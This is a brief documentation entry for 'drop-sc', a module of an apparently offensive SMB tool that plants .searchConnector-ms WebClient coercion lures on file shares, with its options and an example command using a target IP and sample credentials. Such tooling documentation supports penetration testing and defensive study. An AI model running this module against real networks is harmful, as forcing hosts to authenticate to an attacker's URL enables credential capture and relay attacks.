# drop-sc

Drops .searchConnector-ms WebClient coercion lures (URL=..., FILENAME=..., SHARE=..., CLEANUP=True)

Options: `CLEANUP=...`, `FILENAME=...`, `SHARE=...`, `URL=...`

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M drop-sc -o CLEANUP=...,FILENAME=...,SHARE=...,URL=...
```

Via Titanis (`SmbDropScModule.cs`).
